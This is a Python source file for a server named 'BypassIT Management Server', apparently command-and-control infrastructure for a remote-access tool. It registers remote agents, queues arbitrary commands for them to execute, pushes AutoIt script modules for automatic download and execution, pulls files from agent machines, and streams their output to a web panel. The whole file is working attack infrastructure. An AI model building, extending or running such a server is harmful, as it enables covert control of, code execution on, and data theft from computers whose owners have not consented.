import argparse
import shutil
import socket
import threading
from flask import Flask, request, jsonify, render_template, send_from_directory, Response, stream_with_context
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
import os
import time
from werkzeug.utils import secure_filename
import json

# Flask web server setup
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///bypassit.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
UPLOAD_FOLDER = 'uploads'
SCRIPTS_FOLDER= 'scripts'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(80), unique=True, nullable=False)
    computer_name = db.Column(db.String(80), nullable=False)
    status = db.Column(db.String(80), nullable=False, default='online')
    last_checkin = db.Column(db.DateTime, default=datetime.utcnow)
    pending_command = db.Column(db.String(200), nullable=True)
    output_file = db.Column(db.String(200), nullable=True)


    def __repr__(self):
        return f'<Agent {self.agent_id}>'

def init_db():
    with app.app_context():
        db.create_all()

@app.route('/')
def list_agents():
    agents = Agent.query.all()
    return render_template('agents.html', agents=agents)

@app.route('/command', methods=['POST'])
def send_command():
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')

    if not agent_id or not command:
        return jsonify({'error': 'Agent ID and Command are required'}), 400

    with app.app_context():
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        
        agent.pending_command = command
        db.session.commit()
        log_message(f"Command '{command}' scheduled for agent {agent_id}")

    return jsonify({'message': f"Command '{command}' scheduled for agent {agent_id}"}), 200

@app.route('/register', methods=['POST'])
def register_agent():
    data = request.json
    agent_id = data.get('agent_id')
    computer_name = data.get('computer_name')

    if not agent_id or not computer_name:
        return jsonify({'error': 'Agent ID and Computer Name are required'}), 400
    
    with app.app_context():
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if agent:
            agent.computer_name = computer_name
            agent.status = 'online'
            agent.last_checkin = datetime.utcnow()
        else:
            agent = Agent(agent_id=agent_id, computer_name=computer_name, status='online', last_checkin=datetime.utcnow())
            db.session.add(agent)
        db.session.commit()

    return jsonify({'message': f'Agent {agent_id} registered successfully'}), 201

@app.route('/agents_data')
def agents_data():
    agents = Agent.query.all()
    agents_list = [{
        'agent_id': agent.agent_id,
        'computer_name': agent.computer_name,
        'status': agent.status,
        'last_checkin': agent.last_checkin.strftime("%Y-%m-%d %H:%M:%S")  # Format datetime for display
    } for agent in agents]
    return jsonify(agents_list)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    if file:
        filename = secure_filename(file.filename)
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        return jsonify({'message': f'File {filename} uploaded successfully'}), 200

@app.route('/upload_module', methods=['POST'])
def upload_module():
    try:
        data = request.json
        if not data or 'filename' not in data:
            return jsonify({'error': 'No filename provided'}), 400
        
        filename = data['filename']
        source_path = os.path.join(SCRIPTS_FOLDER, filename)
        dest_path = os.path.join(UPLOAD_FOLDER, filename)
        
        if not os.path.exists(source_path):
            return jsonify({'error': 'Script not found'}), 404
        
        shutil.copy2(source_path, dest_path)
        return jsonify({'message': f'Module {filename} copied successfully', 'filename': filename}), 200
    except Exception as e:
        app.logger.error(f'Error in upload_module: {str(e)}')
        return jsonify({'error': f'Server error: {str(e)}'}), 500

@app.route('/scripts/<path:filename>')
def serve_script(filename):
    return send_from_directory(SCRIPTS_FOLDER, filename)

@app.route('/execute_module', methods=['POST'])
def execute_module():
    data = request.json
    agent_id = data.get('agent_id')
    script_name = data.get('script_name')

    if not agent_id or not script_name:
        return jsonify({'error': 'Agent ID and Script Name are required'}), 400

    with app.app_context():
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        
        # Schedule the download of the script
        download_command = f"download_file {script_name}"
        agent.pending_command = download_command
        db.session.commit()
        log_message(f"Command '{download_command}' scheduled for agent {agent_id}")

        # The execution will be handled automatically by the agent after download
        return jsonify({'message': f"Download and execution of '{script_name}' scheduled for agent {agent_id}"}), 200


@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)

@app.route('/get_scripts')
def get_scripts():
    scripts_dir = 'scripts'
    try:
        scripts = [f for f in os.listdir(scripts_dir) if f.endswith('.a3x')]
        if not scripts:
            return jsonify({'error': 'No .au3 scripts found in the scripts directory'}), 404
        return jsonify(scripts)
    except FileNotFoundError:
        return jsonify({'error': 'Scripts directory not found'}), 404
    except PermissionError:
        return jsonify({'error': 'Permission denied when accessing scripts directory'}), 403

@app.route('/stream_output/<agent_id>')
def stream_output(agent_id):
    def generate():
        with app.app_context():
            agent = Agent.query.filter_by(agent_id=agent_id).first()
            if agent and agent.output_file:
                with open(agent.output_file, 'r') as f:
                    while True:
                        line = f.readline()
                        if not line:
                            time.sleep(0.1)  # Wait a bit before checking for new content
                            continue
                        # Escape the line for JSON and preserve whitespace
                        escaped_line = json.dumps(line)[1:-1]
                        yield f"data: {escaped_line}\n\n"
    return Response(generate(), mimetype='text/event-stream')

@app.route('/start_streaming/<agent_id>')
def start_streaming(agent_id):
    with app.app_context():
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if agent:
            agent.output_file = os.path.join(UPLOAD_FOLDER, f"output_{agent_id}.txt")
            db.session.commit()
            return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Agent not found"})

@app.route('/stop_streaming/<agent_id>')
def stop_streaming(agent_id):
    with app.app_context():
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if agent:
            agent.output_file = None
            db.session.commit()
            return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Agent not found"})

@app.route('/clear_output/<agent_id>', methods=['POST'])
def clear_output(agent_id):
    with app.app_context():
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if agent and agent.output_file:
            try:
                os.remove(agent.output_file)
                agent.output_file = None
                db.session.commit()
                return jsonify({"status": "success", "message": "Output file cleared"})
            except Exception as e:
                return jsonify({"status": "error", "message": str(e)})
        return jsonify({"status": "error", "message": "Agent not found or no output file"})

def update_agent_status():
    """Update the status of agents based on their last check-in time."""
    with app.app_context():
        now = datetime.utcnow()
        threshold = now - timedelta(minutes=1)  # Set threshold for offline status

        agents = Agent.query.all()
        for agent in agents:
            if agent.last_checkin < threshold:
                agent.status = 'offline'
            else:
                agent.status = 'online'
        db.session.commit()

def log_message(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def start_status_check():
    while True:
        update_agent_status()
        time.sleep(60)

def handle_client(conn, addr):
    try:
        while True:
            data = conn.recv(4096).decode('utf-8').strip()
            if not data:
                break
            log_message(f"Received data from agent: {data}")

            response = "Invalid command"  # Default response

            if data.startswith("register|"):
                parts = data.split("|")
                if len(parts) == 3:
                    agent_id = parts[1]
                    computer_name = parts[2]
                    log_message(f"Received agent registration: ID={agent_id}, ComputerName={computer_name}")
                    
                    with app.app_context():
                        agent = Agent.query.filter_by(agent_id=agent_id).first()
                        if not agent:
                            agent = Agent(agent_id=agent_id, computer_name=computer_name, status='online', last_checkin=datetime.utcnow())
                            db.session.add(agent)
                        else:
                            agent.computer_name = computer_name
                            agent.status = 'online'
                            agent.last_checkin = datetime.utcnow()
                        db.session.commit()
                        log_message(f"Agent {agent_id} registered or updated")
                    response = "Registration successful"  # Response for registration

            elif data.startswith("request_action|"):
                agent_id = data.split("|")[1]
                log_message(f"Action request from agent {agent_id}")
                with app.app_context():
                    agent = Agent.query.filter_by(agent_id=agent_id).first()
                    if agent and agent.pending_command:
                        log_message(f"Pending command for agent {agent_id}: {agent.pending_command}")
                        if agent.pending_command.startswith("download_file "):
                            # Handle file download command
                            filename = agent.pending_command.split(" ", 1)[1]
                            response = f"download_file|{filename}"
                        elif agent.pending_command.startswith("upload_file "):
                            # Handle file upload command
                            filepath = agent.pending_command.split(" ", 1)[1]
                            response = f"upload_file|{filepath}"
                        else:
                            # Regular command execution
                            response = f"execute_command|{agent.pending_command}"
                        agent.pending_command = None  # Clear command after sending
                        db.session.commit()
                    else:
                        response = "no_pending_commands"
                log_message(f"Responding to request_action for agent {agent_id}: {response}")

            elif data.startswith("download_complete|") or data.startswith("download_failed|"):
                parts = data.split("|")
                if len(parts) == 3:
                    agent_id = parts[1]
                    filename = parts[2]
                    with app.app_context():
                        agent = Agent.query.filter_by(agent_id=agent_id).first()
                        if agent:
                            agent.last_response = data
                            db.session.commit()
                            log_message(f"Download status updated for agent {agent_id}: {data}")
                            response = "Status updated"
                        else:
                            response = "Agent not found"
                else:
                    response = "Invalid download status format"

            elif data.startswith("start_streaming|"):
                parts = data.split("|")
                if len(parts) == 2:
                    agent_id = parts[1]
                    with app.app_context():
                        agent = Agent.query.filter_by(agent_id=agent_id).first()
                        if agent:
                            agent.output_file = os.path.join(UPLOAD_FOLDER, f"output_{agent_id}.txt")
                            db.session.commit()
                            response = "Streaming started"
                            log_message(f"Streaming started for agent {agent_id}")
                        else:
                            response = "Agent not found"

            elif data.startswith("stream_output|"):
                parts = data.split("|", 2)
                if len(parts) == 3:
                    agent_id = parts[1]
                    output_data = parts[2]
                    with app.app_context():
                        agent = Agent.query.filter_by(agent_id=agent_id).first()
                        if agent and agent.output_file:
                            with open(agent.output_file, 'a') as f:
                                f.write(output_data)
                            response = "Output received"
                        else:
                            response = "Agent not found or streaming not started"

            elif data.startswith("stop_streaming|"):
                parts = data.split("|")
                if len(parts) == 2:
                    agent_id = parts[1]
                    with app.app_context():
                        agent = Agent.query.filter_by(agent_id=agent_id).first()
                        if agent:
                            agent.output_file = None
                            db.session.commit()
                            response = "Streaming stopped"
                            log_message(f"Streaming stopped for agent {agent_id}")
                        else:
                            response = "Agent not found"


            elif data.startswith("checkin|"):
                parts = data.split("|")
                if len(parts) == 2:
                    agent_id = parts[1]
                    with app.app_context():
                        agent = Agent.query.filter_by(agent_id=agent_id).first()
                        if agent:
                            agent.last_checkin = datetime.utcnow()
                            db.session.commit()
                            log_message(f"Check-in time updated for agent {agent_id}")
                            response = "Check-in acknowledged"
                        else:
                            response = "Agent not found"
                else:
                    response = "Invalid check-in format"

            log_message(f"Sending response to agent: {response}")
            conn.sendall((response + "\n").encode('utf-8'))

    except Exception as e:
        log_message(f"Error handling client {addr}: {e}")
    finally:
        conn.close()
        log_message(f"Connection closed for {addr}")

def handle_file_transfer(conn, addr):
    log_message(f"File transfer initiated from {addr}")
    try:
        # Send immediate acknowledgment
        conn.send(b'READY')
        log_message(f"Sent READY signal to {addr}")

        data = conn.recv(1024).decode('utf-8').strip()
        log_message(f"Received data from agent: {data}")
        
        if not data:
            log_message("Received empty data from agent")
            return

        parts = data.split('|')
        if len(parts) != 2:
            log_message(f"Invalid data format received: {data}")
            return

        direction, filename = parts
        
        if direction == 'from_agent':
            # Receive file from agent
            log_message(f"Preparing to receive file: {filename}")
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(filename))
            with open(filepath, 'wb') as f:
                while True:
                    data = conn.recv(4096)
                    if data.endswith(b'\r\n{EOF}'):
                        f.write(data[:-7])
                        break
                    f.write(data)
            log_message(f"File {filename} received from agent {addr}")
        
        elif direction == 'to_agent':
            # Send file to agent
            log_message(f"Preparing to send file: {filename}")
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(filename))
            if os.path.exists(filepath):
                file_size = os.path.getsize(filepath)
                log_message(f"File found, sending file info")
                conn.send(f"{filename}|{file_size}".encode('utf-8'))
                
                # Wait for START signal from agent
                start_signal = conn.recv(1024).decode('utf-8').strip()
                if start_signal != "START":
                    log_message(f"Invalid start signal received: {start_signal}")
                    return

                with open(filepath, 'rb') as f:
                    while True:
                        data = f.read(4096)
                        if not data:
                            break
                        conn.send(data)
                log_message(f"File {filename} sent to agent {addr}")
            else:
                log_message(f"File not found: {filepath}")
                conn.send(b'FILE_NOT_FOUND')
        else:
            log_message(f"Invalid direction received: {direction}")
    
    except Exception as e:
        log_message(f"Error in file transfer: {str(e)}")
    finally:
        conn.close()
        log_message(f"File transfer connection closed for {addr}")

def start_file_transfer_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 5075))
    server.listen(5)
    log_message("File transfer server listening on port 5075")
    while True:
        conn, addr = server.accept()
        file_thread = threading.Thread(target=handle_file_transfer, args=(conn, addr))
        file_thread.start()

def start_cli_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 5074))
    server.listen(5)
    log_message("CLI server listening on port 5074")
    while True:
        conn, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr))
        client_thread.start()

def main():
    parser = argparse.ArgumentParser(description='BypassIT Management Server')
    parser.add_argument('--cli', action='store_true', help='Start the CLI server')
    parser.add_argument('--web', action='store_true', help='Start the web server')
    args = parser.parse_args()
    print('''
     ____                                                      ______      ______   
    /\  _`\                                                   /\__  _\    /\__  _\  
    \ \ \L\ \    __  __     _____      __        ____    ____ \/_/\ \/    \/_/\ \/  
     \ \  _ <'  /\ \/\ \   /\ '__`\  /'__`\     /',__\  /',__\   \ \ \       \ \ \  
      \ \ \L\ \ \ \ \_\ \  \ \ \L\ \/\ \L\.\_  /\__, `\/\__, `\   \_\ \__     \ \ \ 
       \ \____/  \/`____ \  \ \ ,__/\ \__/.\_\ \/\____/\/\____/   /\_____\     \ \ \      
        \/___/    `/___/> \  \ \ \/  \/__/\/_/  \/___/  \/___/    \/_____/      \/_/
                     /\___/   \ \_\                                                 
                     \/__/     \/_/                                                 
    
    ''')
    # Print the database file location
    database_uri = app.config['SQLALCHEMY_DATABASE_URI']
    if database_uri.startswith('sqlite:///'):
        db_path = database_uri.split('sqlite:///')[1]
        abs_db_path = os.path.abspath(db_path)

    if args.cli:
        threading.Thread(target=start_cli_server).start()
        threading.Thread(target=start_file_transfer_server).start()

    if args.web:
        init_db()
        threading.Thread(target=start_web_server).start()

        status_thread = threading.Thread(target=start_status_check)
        status_thread.daemon = True
        status_thread.start()

def start_web_server():
    app.run(host='0.0.0.0', port=8080)

if __name__ == '__main__':
    main()
